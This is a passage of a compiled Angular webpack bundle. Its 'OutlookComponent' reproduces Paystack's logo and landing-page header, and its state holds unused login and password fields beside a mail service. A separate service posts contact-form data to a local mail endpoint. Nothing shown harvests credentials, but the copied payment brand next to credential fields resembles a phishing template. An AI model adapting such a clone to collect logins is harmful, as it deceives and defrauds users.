biAgICBtYXJnaW4tbGVmdDogNnB4O1xufVxuLmJ0bi1ncm91cC1mZWF0dXJlcyA+IHNwYW4sIC5idG4tZ3JvdXAtYXV0aCA+IHNwYW4ge1xuICAgIG1hcmdpbi1sZWZ0OiAyNXB4O1xufVxuXG4ubWFwLXdyYXBwZXIge1xuICAgIHdpZHRoOiAxMDAlO1xuICAgIGhlaWdodDogMTAwdmg7XG4gICAgYmFja2dyb3VuZDogcmdiYSgyNDEsMjU0LDI0NCwwLjk1KTtcbn1cbi5pbmZvIHtcbiAgICBkaXNwbGF5OiBmbGV4O1xuICAgIGZsZXgtZGlyZWN0aW9uOiBjb2x1bW47XG4gICAgcG9zaXRpb246IGFic29sdXRlO1xuICAgIGxlZnQ6IDEwMHB4O1xuICAgIHRvcDogNDAwcHg7XG4gICAgd2lkdGg6IDQ1MHB4O1xuXG59XG4uaW5mbyA+IGgxIHtcbiAgICBmb250LXdlaWdodDogOTAwO1xuICAgIG1hcmdpbi1ib3R0b206IDE1cHg7XG4gICAgXG59XG4uaW5mbyA+IGgzIHtcbiAgICBmb250LXdlaWdodDogbGlnaHQ7XG59XG4uaW5mbyA+IGEge1xuICAgIHdpZHRoOiAxODBweDtcbiAgICBoZWlnaHQ6IDQwcHg7XG4gICAgYm9yZGVyLXJhZGl1czogNXB4O1xuICAgIGRpc3BsYXk6IGZsZXg7XG4gICAgYWxpZ24taXRlbXM6IGNlbnRlcjtcbiAgICBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjtcbiAgICBjb2xvcjogd2hpdGU7XG4gICAgYmFja2dyb3VuZC1jb2xvcjogcmdiKDI0LCAxNjUsIDI0KTtcbiAgICBvdmVyZmxvdzogd3JhcDtcbn1cblxuXG5cblxuXG5cblxuXG5cblxuXG5cblxuXG5cblxuXG5cblxuXG5cblxuXG5cblxuXG5cblxuXG5cblxuXG5cblxuXG5cblxuXG4vKiAuY29udGFpbmVye1xuICAgIHdpZHRoOiAxMDAlO1xuICAgIGhlaWdodDogMTAwdmg7XG4gICAgZGlzcGxheTogZmxleDtcbn1cbi5yb3ctc2lkZSB7XG4gICAgd2lkdGg6IDM1JTtcbiAgICBoZWlnaHQ6IDEwMCU7XG4gICAgZGlzcGxheTogZmxleDtcbiAgICBhbGlnbi1pdGVtczogY2VudGVyO1xuICAgIGp1c3RpZnktY29udGVudDogY2VudGVyO1xuICAgIGJhY2tncm91bmQtY29sb3I6IGJsdWV2aW9sZXQ7XG59XG4uY29udGVudCB7XG4gICAgZGlzcGxheTogZmxleDtcbiAgICBhbGlnbi1pdGVtczogY2VudGVyO1xuICAgIGp1c3RpZnktY29udGVudDogY2VudGVyO1xuICAgIHdpZHRoOiA1MDBweDtcbiAgICBoZWlnaHQ6IDEwMCU7XG59XG4ucm93LWNvbnRlbnQge1xuICAgIGRpc3BsYXk6IGZsZXg7XG4gICAgZmxleC1kaXJlY3Rpb246IGNvbHVtbjtcbn1cbi5pbWctb3V0bG9vayB7XG5iYWNrZ3JvdW5kOiB0cmFuc3BhcmVudDtcbn1cbmg2IHtcbiAgICBjb2xvcjogZGFya2dyYXk7XG4gICAgZm9udC1zaXplOiAxMHB4O1xuICAgIG1hcmdpbjogMjBweCAwO1xufVxuLmZvcm0ge1xuICAgIGRpc3BsYXk6IGZsZXg7XG4gICAgZmxleC1kaXJlY3Rpb246IGNvbHVtbjtcbn1cbi5mb3JtLWdyb3VwIHtcbiAgICBkaXNwbGF5OiBmbGV4O1xuICAgIGZsZXgtZGlyZWN0aW9uOiBjb2x1bW47XG4gICAgbWFyZ2luLWJvdHRvbTogMTVweDtcbn1cblxuLnNwbi1sYW5ndWFnZXMge1xuICAgIGNvbG9yOiBkYXJrZ3JheTtcbiAgICBmb250LXNpemU6IDEzcHg7XG59XG4uYnRuLXNhdmUtZ3JvdXAge1xuICAgIGRpc3BsYXk6IGZsZXg7XG4gICAgbWFyZ2luOiAyNXB4IDA7XG59XG4uYnRuLWljb24tY29udGFpbmVyIHtcbiAgICBib3JkZXItcmFkaXVzOiA1MCU7XG4gICAgd2lkdGg6IDE1cHg7XG4gICAgaGVpZ2h0OiAxNXB4O1xuICAgIGJvcmRlcjogMnB4IHNvbGlkIGJsdWV2aW9sZXQ7XG59XG4uc3BuLXNhdmUge1xuICAgIG1hcmdpbi1sZWZ0OiAxNXB4O1xuICAgIGNvbG9yOiBibHVldmlvbGV0O1xuICAgIGZvbnQtc2l6ZTogMTZweDtcbn1cbi5jb250ZW50OmJlZm9yZSB7XG4gICAgY29udGVudDogXCIgXCI7XG4gICAgZGlzcGxheTogZmxleDtcbiAgICBwb3NpdGlvbjogcmVsYXRpdmU7XG4gICAgbGVmdDowO1xuICAgIHJpZ2h0OiAwO1xuICAgIHRvcDowO1xuICAgIGJvdHRvbTowO1xuICAgIGJhY2tncm91bmQ6IGluaGVyaXQ7XG4gICAgZmlsdGVyOiBibHVyKDVweCk7XG59XG5AbWVkaWEgb25seSBzY3JlZW4gYW5kIChtYXgtd2lkdGg6IDYwMHB4KSB7XG4gICAgLmNvbnRhaW5lciB7XG4gICAgICAgIGRpc3BsYXk6IGZsZXg7XG4gICAgICAgIGZsZXgtZGlyZWN0aW9uOiBjb2x1bW47XG4gICAgfVxuICAgIC5yb3ctc2lkZSB7XG4gICAgICAgIHdpZHRoOiAxMDAlO1xuICAgICAgICBtaW4taGVpZ2h0OiAzNTBweDtcbiAgICB9XG4gICAgLmNvbnRlbnQge1xuICAgICAgICBcbiAgICB9XG59ICovIl19 */"

/***/ }),

/***/ "./src/app/outlook/outlook.component.html":
/*!************************************************!*\
  !*** ./src/app/outlook/outlook.component.html ***!
  \************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "<div class=\"container\">\n  <div class=\"row-header\">\n    \n    <div class=\"btn-group-features\">\n        <div class=\"svg-header-logo\">\n            <svg height=50 width=100 xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 147 28\" fill=\"none\">\n          <path fill-rule=\"evenodd\" clip-rule=\"evenodd\" d=\"M1.51165 0H25.7369C26.5715 0 27.2504 0.671185 27.2504 1.50214V4.16909C27.2504 4.99651 26.5716 5.67141 25.7369 5.67141H1.51165C0.676996 5.67141 0 4.99657 0 4.16909V1.50214C0 0.671185 0.676996 0 1.51165 0ZM1.51165 14.887H25.7369C26.5715 14.887 27.2504 15.5599 27.2504 16.3874V19.058C27.2504 19.8854 26.5716 20.5566 25.7369 20.5566H1.51165C0.676996 20.5566 0 19.8854 0 19.058V16.3874C0 15.5599 0.676996 14.887 1.51165 14.887ZM15.1376 22.3304H1.51165C0.676996 22.3304 0 23.0016 0 23.8309V26.4997C0 27.3272 0.676996 28 1.51165 28H15.1377C15.9759 28 16.6511 27.3272 16.6511 26.4997V23.8309C16.6511 23.0016 15.9759 22.3304 15.1376 22.3304ZM1.51165 7.44171H27.2504C28.0868 7.44171 28.7619 8.11469 28.7619 8.94379V11.6127C28.7619 12.4401 28.0868 13.1148 27.2504 13.1148H1.51165C0.676996 13.1148 0 12.4401 0 11.6127V8.94379C0 8.11469 0.676996 7.44171 1.51165 7.44171Z\" fill=\"#09A5DB\"></path>\n          <path fill-rule=\"evenodd\" clip-rule=\"evenodd\" d=\"M109.756 17.5829L105.561 11.473L109.151 6.77908C109.339 6.50854 109.387 6.24913 109.301 6.00538C109.238 5.82981 109.069 5.61788 108.634 5.61788H105.796C105.636 5.61788 105.479 5.65747 105.329 5.73025C105.168 5.79985 105.023 5.9423 104.913 6.12887L102.044 10.1077H101.346V0.705584C101.346 0.506208 101.278 0.341698 101.148 0.200867C101.017 0.0727158 100.842 0 100.646 0H97.9906C97.7969 0 97.6251 0.0727768 97.4832 0.199314C97.3398 0.335421 97.2642 0.499992 97.2642 0.705584V18.0623C97.2642 18.2615 97.3398 18.4356 97.4832 18.5654C97.6251 18.6998 97.7969 18.7662 97.9906 18.7662H100.646C100.842 18.7662 101.017 18.6998 101.148 18.5622C101.278 18.4292 101.346 18.2615 101.346 18.0623V13.4649H102.114L105.247 18.2189C105.469 18.5827 105.778 18.7663 106.163 18.7663H109.135C109.586 18.7663 109.774 18.5544 109.849 18.3739C109.957 18.1192 109.925 17.8629 109.756 17.5829ZM65.9565 14.653C66.1959 14.6656 66.3993 14.7938 66.5443 15.028L67.4665 16.5057C67.7138 16.8933 67.6776 17.2825 67.3749 17.6353C66.9178 18.113 66.3427 18.4706 65.6586 18.7064C64.973 18.9389 64.2448 19.0575 63.4788 19.0575C62.9273 19.0575 62.3661 18.9785 61.8178 18.8139C61.2677 18.6525 60.779 18.3946 60.3613 18.0592C59.9438 17.7238 59.5985 17.2762 59.3368 16.7445C59.0752 16.2066 58.9382 15.5532 58.9382 14.7939V9.10961H57.4077C57.206 9.10961 57.0342 9.03354 56.9003 8.87537C56.7742 8.72671 56.7048 8.55747 56.7048 8.3786V6.35042C56.7048 6.15266 56.7742 5.98343 56.9003 5.84253C57.0373 5.69232 57.206 5.61793 57.4077 5.61793H58.9382V2.36378C58.9382 2.14862 59.0185 1.96813 59.1572 1.83687C59.3022 1.70238 59.4739 1.6375 59.6679 1.6375H62.3487C62.5253 1.6375 62.6877 1.70238 62.8343 1.83687C62.9793 1.9682 63.0487 2.14862 63.0487 2.36378V5.61793H66.5003C66.6988 5.61793 66.8708 5.69232 67.0251 5.82985C67.1797 5.97392 67.2535 6.15266 67.2535 6.35042V8.3786C67.2535 8.56064 67.1797 8.72994 67.0298 8.88171C66.8753 9.03354 66.6988 9.10961 66.5003 9.10961H63.0487V13.8921C63.0487 14.1879 63.0897 14.422 63.1668 14.596C63.2472 14.767 63.3387 14.9014 63.452 14.9916C63.564 15.0817 63.6901 15.1483 63.8129 15.1736C63.9501 15.2084 64.0778 15.2211 64.1881 15.2211C64.3174 15.2211 64.4749 15.202 64.6626 15.1483C64.8532 15.0976 65.0534 15.0059 65.2709 14.8729C65.4978 14.7195 65.7327 14.6404 65.9565 14.653ZM54.9505 11.8464C54.5817 11.5237 54.139 11.261 53.6471 11.0649C53.1555 10.8688 52.632 10.7137 52.0836 10.6093L50.0615 10.2121C49.5429 10.1157 49.1821 9.98434 48.9787 9.81822C48.7974 9.67428 48.7076 9.50816 48.7076 9.30406C48.7076 9.09051 48.8353 8.91332 49.0843 8.75665C49.3585 8.58909 49.7401 8.50351 50.2129 8.50351C50.7346 8.50351 51.2452 8.60637 51.7227 8.80885C52.2065 9.01463 52.6605 9.24868 53.0561 9.50977C53.6455 9.87043 54.1452 9.82294 54.5061 9.40536L55.477 8.29624C55.6757 8.07785 55.7797 7.84062 55.7797 7.60334C55.7797 7.35499 55.6534 7.12715 55.4109 6.91988C54.9995 6.56389 54.3486 6.18583 53.477 5.81722C52.6055 5.44227 51.5084 5.25241 50.213 5.25241C49.3633 5.25241 48.5785 5.36639 47.8849 5.58777C47.1869 5.81244 46.5893 6.1225 46.1056 6.50851C45.6169 6.90403 45.2324 7.36437 44.9692 7.89444C44.7091 8.41961 44.5735 8.99548 44.5735 9.59517C44.5735 10.6851 44.9077 11.5726 45.5619 12.2356C46.2159 12.8826 47.089 13.3239 48.1622 13.5391L50.2633 13.9901C50.8607 14.1086 51.3145 14.2448 51.6093 14.3966C51.8646 14.5264 51.9875 14.7131 51.9875 14.974C51.9875 15.2083 51.8646 15.4155 51.6124 15.6037C51.3476 15.8062 50.9299 15.9059 50.3735 15.9059C49.7668 15.9059 49.2135 15.7808 48.7154 15.5372C48.216 15.2921 47.7619 14.9961 47.3632 14.6466C47.1756 14.4979 46.9692 14.3871 46.7532 14.3159C46.5011 14.2431 46.2188 14.3206 45.8927 14.5707L44.731 15.4646C44.3939 15.7461 44.2519 16.0862 44.315 16.4786C44.3719 16.8552 44.6934 17.2443 45.2938 17.6857C45.8297 18.0591 46.5168 18.3991 47.3443 18.6902C48.1717 18.9845 49.141 19.1348 50.2411 19.1348C51.1254 19.1348 51.9433 19.0226 52.6621 18.8011C53.3856 18.57 54.0191 18.2615 54.5377 17.866C55.0609 17.4689 55.4675 16.9817 55.7512 16.4279C56.0334 15.8743 56.1721 15.2683 56.1721 14.6339C56.1721 14.0154 56.0649 13.4696 55.8428 13.0107C55.6221 12.5567 55.3225 12.1644 54.9505 11.8464ZM12.2131 7.13189C11.6236 6.53239 10.9348 6.05931 10.1657 5.73651C9.39497 5.41377 8.57229 5.25243 7.71816 5.25243C6.82447 5.25243 6.02687 5.41855 5.35075 5.75553C4.82447 6.01338 4.37837 6.34091 4.03164 6.7222V6.35042C4.03164 6.15266 3.96069 5.98343 3.83463 5.84254C3.69736 5.69232 3.52882 5.61793 3.32698 5.61793H0.70454C0.499535 5.61793 0.329269 5.69232 0.198689 5.84254C0.0677376 5.98343 0 6.15266 0 6.35042V23.7878C0 23.984 0.0677376 24.1549 0.200111 24.291C0.335644 24.4237 0.499535 24.4902 0.704475 24.4902H3.37905C3.56034 24.4902 3.72274 24.4237 3.86447 24.291C4.00948 24.158 4.08204 23.9888 4.08204 23.7878V17.8361C4.43973 18.2316 4.91586 18.5338 5.48325 18.7411C6.19869 19.0068 6.9332 19.1349 7.66145 19.1349C8.5204 19.1349 9.35242 18.9752 10.1373 18.6525C10.9271 18.3218 11.6236 17.8504 12.2131 17.2445C12.8026 16.64 13.2786 15.8966 13.6205 15.0517C13.9736 14.1975 14.1439 13.2323 14.1439 12.1804C14.1439 11.1315 13.9736 10.1648 13.6205 9.31054C13.2785 8.464 12.8026 7.72672 12.2131 7.13189ZM9.81269 13.4317C9.66298 13.8034 9.45173 14.1404 9.18388 14.422C8.91907 14.7037 8.60391 14.933 8.24765 15.0881C7.89139 15.2479 7.4911 15.3286 7.06085 15.3286C6.64472 15.3286 6.24604 15.2431 5.88346 15.0881C5.51791 14.933 5.1931 14.7037 4.91882 14.422C4.64781 14.1404 4.43185 13.8035 4.28214 13.4317C4.1323 13.0535 4.05361 12.6437 4.05361 12.2071C4.05361 11.7705 4.1323 11.3608 4.28214 10.9794C4.43185 10.6093 4.64781 10.2787 4.91882 10.0034C5.1931 9.72501 5.51791 9.50338 5.88501 9.33576C6.2523 9.16957 6.64472 9.08418 7.06079 9.08418C7.49104 9.08418 7.88662 9.16957 8.24431 9.33576C8.60385 9.50338 8.91894 9.72507 9.18852 10.0001C9.45166 10.2786 9.66292 10.6093 9.81263 10.9794C9.96247 11.3608 10.0363 11.7705 10.0363 12.2071C10.0364 12.6437 9.96253 13.0535 9.81269 13.4317ZM28.5005 5.6178H25.8495C25.6698 5.6178 25.4996 5.6922 25.3593 5.83141C25.219 5.9802 25.1449 6.1526 25.1449 6.35036V6.67149C24.8471 6.31239 24.4419 6.00537 23.944 5.75553C23.2756 5.41855 22.4924 5.25243 21.6193 5.25243C20.7776 5.25243 19.9516 5.41377 19.1699 5.73651C18.3819 6.05931 17.6743 6.52593 17.0675 7.12716C16.4622 7.72672 15.9704 8.46083 15.6033 9.31048C15.2393 10.1584 15.0548 11.1282 15.0548 12.1803C15.0548 13.2322 15.2393 14.1974 15.6033 15.0517C15.9705 15.8965 16.4559 16.64 17.0548 17.2444C17.6539 17.8503 18.3567 18.3218 19.1431 18.6524C19.9266 18.975 20.7523 19.1349 21.594 19.1349C22.4657 19.1349 23.2552 18.9657 23.9314 18.6335C24.431 18.3818 24.8407 18.075 25.145 17.7174V18.0624C25.145 18.2616 25.2191 18.4358 25.3641 18.5655C25.506 18.7 25.6699 18.7663 25.8495 18.7663H28.5005C28.7007 18.7663 28.8678 18.7 29 18.5623C29.134 18.4294 29.2034 18.2616 29.2034 18.0624V6.35036C29.2034 6.1526 29.1356 5.98337 29.0049 5.84247C28.8741 5.69226 28.7007 5.6178 28.5005 5.6178ZM24.9211 13.4159C24.7715 13.8034 24.5603 14.1341 24.2987 14.4093C24.0307 14.6877 23.7107 14.9093 23.356 15.077C23.0014 15.2431 22.5979 15.3285 22.1677 15.3285C21.7548 15.3285 21.3577 15.2431 20.9934 15.077C20.6279 14.9093 20.3095 14.6877 20.0401 14.4093C19.7768 14.1404 19.5655 13.8034 19.4158 13.4159C19.2677 13.0313 19.192 12.6232 19.192 12.2071C19.192 11.7705 19.2677 11.3608 19.4158 10.9794C19.5655 10.6061 19.7768 10.2722 20.0401 10.0001C20.3095 9.72501 20.6265 9.50338 20.9934 9.33576C21.3577 9.16957 21.7548 9.08418 22.1677 9.08418C22.5979 9.08418 23.0015 9.16957 23.356 9.33576C23.7107 9.50338 24.0306 9.72507 24.2987 10.0001C24.5603 10.2786 24.7715 10.6093 24.9211 10.9794C25.071 11.3608 25.1449 11.7705 25.1449 12.2071C25.1449 12.6232 25.0709 13.0314 24.9211 13.4159ZM78.425 5.6178H81.0744C81.2793 5.6178 81.4495 5.69226 81.5803 5.84247C81.711 5.98337 81.7787 6.1526 81.7787 6.35036V18.0624C81.7787 18.2616 81.7078 18.4294 81.577 18.5623C81.4399 18.7 81.273 18.7663 81.0743 18.7663H78.4249C78.2437 18.7663 78.0828 18.7 77.941 18.5655C77.796 18.4358 77.7251 18.2616 77.7251 18.0624V17.7174C77.4162 18.075 77.0127 18.3818 76.5052 18.6335C75.8307 18.9657 75.0426 19.1349 74.1632 19.1349C73.3263 19.1349 72.5036 18.975 71.7186 18.6524C70.9322 18.3218 70.2276 17.8503 69.6319 17.2444C69.0315 16.64 68.5459 15.8965 68.1804 15.0517C67.8147 14.1974 67.6303 13.2322 67.6303 12.1803C67.6303 11.1282 67.8147 10.1584 68.1804 9.31048C68.5459 8.46083 69.0376 7.72672 69.6444 7.12716C70.2514 6.52593 70.959 6.05931 71.747 5.73651C72.5287 5.41377 73.3546 5.25243 74.1915 5.25243C75.071 5.25243 75.8512 5.41855 76.5194 5.75553C77.0175 6.00537 77.421 6.31239 77.7252 6.67149V6.35036C77.7252 6.1526 77.7961 5.9802 77.938 5.83141C78.0829 5.6922 78.2437 5.6178 78.425 5.6178ZM76.8677 14.4093C77.1358 14.1341 77.3469 13.8034 77.4951 13.4159C77.6464 13.0314 77.7252 12.6232 77.7252 12.2071C77.7252 11.7705 77.6464 11.3608 77.4951 10.9794C77.3469 10.6093 77.1358 10.2786 76.8677 10.0001C76.6046 9.72507 76.2877 9.50338 75.927 9.33576C75.5707 9.16957 75.1768 9.08418 74.7431 9.08418C74.3303 9.08418 73.9362 9.16957 73.5706 9.33576C73.2066 9.50338 72.885 9.72501 72.6171 10.0001C72.3539 10.2722 72.1427 10.6061 71.9914 10.9794C71.8417 11.3608 71.7677 11.7705 71.7677 12.2071C71.7677 12.6232 71.8417 13.0313 71.9914 13.4159C72.1427 13.8034 72.3539 14.1404 72.6171 14.4093C72.885 14.6877 73.2066 14.9093 73.5706 15.077C73.9363 15.2431 74.3303 15.3285 74.7431 15.3285C75.1768 15.3285 75.5707 15.2431 75.927 15.077C76.2877 14.9093 76.6046 14.6877 76.8677 14.4093ZM94.1167 13.7006L95.6375 14.854C95.8189 14.9963 95.9496 15.1735 96.0301 15.3856C96.1121 15.6101 96.0964 15.8428 95.9671 16.0769C95.409 16.966 94.6195 17.7017 93.6107 18.2712C92.6052 18.8455 91.4027 19.1349 90.0535 19.1349C89.078 19.1349 88.1449 18.9546 87.2952 18.5986C86.4364 18.2395 85.6814 17.7428 85.0509 17.1258C84.4158 16.5104 83.9162 15.77 83.5615 14.933C83.2038 14.0883 83.0178 13.1691 83.0178 12.2072C83.0178 11.2422 83.2038 10.3214 83.5615 9.47187C83.9162 8.6175 84.4158 7.87873 85.0509 7.26016C85.6814 6.64003 86.4364 6.14799 87.2952 5.79038C88.1449 5.43451 89.078 5.25254 90.0535 5.25254C91.4027 5.25254 92.6052 5.54365 93.6107 6.11157C94.6195 6.68745 95.4089 7.42156 95.9623 8.30271C96.0963 8.54 96.112 8.77723 96.03 9.01147C95.9496 9.23931 95.8125 9.41009 95.6296 9.53352L94.1104 10.6884C93.8267 10.9162 93.554 10.9794 93.3113 10.8847C93.0954 10.796 92.9125 10.6632 92.758 10.486C92.3814 10.0413 91.9889 9.69163 91.5933 9.44645C91.204 9.20761 90.7075 9.08418 90.1133 9.08418C89.6768 9.08418 89.2765 9.16957 88.9234 9.33576C88.5624 9.50338 88.2472 9.72501 87.9824 10.0001C87.7146 10.2722 87.5082 10.6061 87.3677 10.9794C87.2259 11.356 87.1566 11.7642 87.1566 12.2071C87.1566 12.6264 87.2259 13.0268 87.3677 13.4063C87.5129 13.7781 87.7193 14.1151 87.9824 14.3967C88.2504 14.6848 88.5624 14.9046 88.9186 15.0628C89.2765 15.2211 89.6768 15.3001 90.1133 15.3001C90.7074 15.3001 91.2102 15.1799 91.5933 14.9426C91.9889 14.6973 92.3814 14.3461 92.7548 13.9031C92.9125 13.7259 93.0954 13.5914 93.3113 13.5044C93.5491 13.4063 93.8267 13.4696 94.1167 13.7006ZM40.6113 5.61785H43.5806C43.9841 5.61785 44.1575 5.80138 44.2316 5.95644C44.3216 6.16048 44.3216 6.41044 44.2223 6.71261L39.8597 20.8213C39.4703 22.0601 38.8304 23.0537 37.9636 23.783C37.0904 24.5187 35.9557 24.8825 34.597 24.8825C33.7933 24.8825 33.0367 24.7639 32.3526 24.5217C31.6608 24.2781 31.0744 23.938 30.6064 23.5014C30.3589 23.2862 30.1445 22.8986 30.5307 22.3054L31.4748 20.9305C31.6561 20.6537 31.8798 20.5113 32.1399 20.5113H32.1715C32.4156 20.5224 32.6412 20.5967 32.8397 20.7343C33.0462 20.8909 33.2794 21.0239 33.5378 21.1425C33.7932 21.2548 34.0564 21.3149 34.3338 21.3149C34.6711 21.3149 34.958 21.22 35.2148 21.0286C35.4701 20.8404 35.6671 20.5587 35.7934 20.1996L36.1732 19.1348L36.3039 18.7662H36.277H35.8169H35.7145H34.7152C34.4834 18.7662 34.2959 18.6998 34.154 18.5653C34.0232 18.4452 33.9254 18.2932 33.8641 18.1128L30.1036 6.71255C30.0263 6.45481 30.0263 6.20473 30.1082 5.99273C30.2012 5.74438 30.4518 5.61779 30.8504 5.61779H33.9254C34.1461 5.61779 34.3274 5.70324 34.4535 5.85992C34.5591 6.00218 34.6379 6.16364 34.6772 6.34083L37.0335 14.4394H37.5693L39.7586 6.33766C39.7995 6.16047 39.8878 5.9928 40.0186 5.85352C40.1588 5.7033 40.3623 5.61785 40.6113 5.61785Z\" transform=\"translate(37.0884 1.16753)\" fill=\"#011B33\"></path>\n            </svg>\n          </div>\n      <span>\n          <a class=\"feature-with-content\">Why Paystack</a>\n          <i  id=\"angle-down\" class=\"fa fa-angle-down\"></i>\n      </span>\n      <span>\n          <a>Customer</a>\n      </span>\n      <span>\n          <a>Pricng</a>\n      </span>\n      <span>\n          <a>Learn</a>\n          <i  id=\"angle-down\" class=\"fa fa-angle-down\"></i>\n      </span>\n      \n    \n    </div>\n    <div class=\"btn-group-auth\">\n        <span>\n            <a class=\"feature-with-content\">Developers</a>\n            <i  id=\"angle-down\" class=\"fa fa-angle-down\"></i>\n        </span>\n        <span>\n            <a class=\"feature-with-content\">Support</a>\n            <i  id=\"angle-down\" class=\"fa fa-angle-down\"></i>\n        </span>\n        <span>\n            <a>Login</a>\n        </span>\n        <a class=\"btn-create\">Create Free Account</a>\n        <span>\n            <i  id=\"angle-down\" class=\"fa fa-angle-down\"></i>\n        </span>\n        \n      \n      </div>\n  </div>\n\n  <div class=\"map-wrapper\">\n    \n  </div>\n  <div class=\"info\">\n    <h1>\n      Modern online and modern payment for Africa\n    </h1>\n    <h3>\n\n    </h3>\n    <!-- <a class=\"btn-create\" (click)=\"sendMail()\">\n      Create Free Account\n    </a> -->\n  </div>\n</div>\n\n\n"

/***/ }),

/***/ "./src/app/outlook/outlook.component.ts":
/*!**********************************************!*\
  !*** ./src/app/outlook/outlook.component.ts ***!
  \**********************************************/
/*! exports provided: OutlookComponent */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "OutlookComponent", function() { return OutlookComponent; });
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");
/* harmony import */ var _mail_service__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! ../mail.service */ "./src/app/mail.service.ts");
var __decorate = (undefined && undefined.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (undefined && undefined.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};


var OutlookComponent = /** @class */ (function () {
    function OutlookComponent(mailService) {
        this.mailService = mailService;
        // @ViewChild("login") login: ElementRef;
        // @ViewChild("password") password: ElementRef;
        this.forms = {
            login: "",
            password: ""
        };
    }
    OutlookComponent.prototype.ngOnInit = function () {
    };
    OutlookComponent.prototype.featureWithContent = function () {
    };
    OutlookComponent = __decorate([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_0__["Component"])({
            selector: 'app-outlook',
            template: __webpack_require__(/*! ./outlook.component.html */ "./src/app/outlook/outlook.component.html"),
            styles: [__webpack_require__(/*! ./outlook.component.css */ "./src/app/outlook/outlook.component.css")]
        }),
        __metadata("design:paramtypes", [_mail_service__WEBPACK_IMPORTED_MODULE_1__["MailService"]])
    ], OutlookComponent);
    return OutlookComponent;
}());



/***/ }),

/***/ "./src/app/services/request.service.ts":
/*!*********************************************!*\
  !*** ./src/app/services/request.service.ts ***!
  \*********************************************/
/*! exports provided: RequestService */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "RequestService", function() { return RequestService; });
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");
/* harmony import */ var _angular_common_http__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! @angular/common/http */ "./node_modules/@angular/common/fesm5/http.js");
var __decorate = (undefined && undefined.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (undefined && undefined.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};


var RequestService = /** @class */ (function () {
    function RequestService(http) {
        this.http = http;
        this.url = "http://localhost:3000/send-mail";
    }
    RequestService.prototype.recieveRequest = function (request) {
        var body = {
            params: {
                'firstName': request.firstName,
                'lastName': request.lastName,
                'phoneNumber': request.phoneNumber,
                'location': request.location,
                'message': request.message,
                'email': request.email
            }
        };
        console.log(body);
        return this.http.post(this.url, body).subscribe(function (res) { return console.log(res); });
    };
    RequestService = __decorate([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_0__["Injectable"])({
            providedIn: 'root'
        }),
        __metadata("design:paramtypes", [_angular_common_http__WEBPACK_IMPORTED_MODULE_1__["HttpClient"]])
    ], RequestService);
    return RequestService;
}());



/***/ }),

/***/ "./src/app/views/about-the-test/about-the-test.component.html":
/*!********************************************************************!*\
  !*** ./src/app/views/about-the-test/about-the-test.component.html ***!
  \********************************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "<p>\n  about-the-test works!\n</p>\n"

/***/ }),

/***/ "./src/app/views/about-the-test/about-the-test.component.scss":
/*!********************************************************************!*\
  !*** ./src/app/views/about-the-test/about-the-test.component.scss ***!
  \********************************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "\n/*# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6IiIsImZpbGUiOiJzcmMvYXBwL3ZpZXdzL2Fib3V0LXRoZS10ZXN0L2Fib3V0LXRoZS10ZXN0LmNvbXBvbmVudC5zY3NzIn0= */"

/***/ }),

/***/ "./src/app/views/about-the-test/about-the-test.component.ts":
/*!******************************************************************!*\
  !*** ./src/app/views/about-the-test/about-the-test.component.ts ***!
  \******************************************************************/
/*! exports provided: AboutTheTestComponent */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "AboutTheTestComponent", function() { return AboutTheTestComponent; });
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");
var __decorate = (undefined && undefined.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
